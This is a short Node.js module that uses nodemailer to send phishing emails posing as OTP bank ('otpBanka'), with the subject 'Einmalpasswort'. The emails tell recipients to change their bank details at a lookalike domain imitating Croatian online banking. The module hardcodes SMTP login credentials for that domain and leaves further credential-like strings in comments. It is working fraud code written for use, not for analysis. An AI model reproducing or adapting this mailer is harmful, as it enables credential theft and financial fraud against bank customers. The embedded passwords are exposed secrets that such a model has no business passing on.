const createTransport = require("nodemailer").createTransport;

 const SendMail = async (email) => {
  return new Promise((resolve, reject) => {
    let transporter = createTransport({
      host: "mail.otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net",
      port: 465,
      secure: true,
      auth: {
        // admin@flirttool.com
        user: "info@otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net",
        pass: "tBTFy4xvS1",
      },
    });

    let HTML = `
    <p> Please change your bank details from the following link</p>
    <br/><br/><br/><br/>
    <a href="https://otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net/">https://otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net</a>
    `;

    // mailto:kawa@bahoz.de
    // lx3.hoststar.hosting
    //H1ftqjlWnt-dkrUTga
    transporter
      .sendMail({
        from: "otpBanka",
        to: email,
        subject: "Einmalpasswort",
        // text:"test message"
        // html:"<html></html>"
        html: HTML,
      })
      .then((result) => {
        resolve(result);
      })
      .catch((e) => reject(e));
  });
};


module.exports = {
  SendMail
}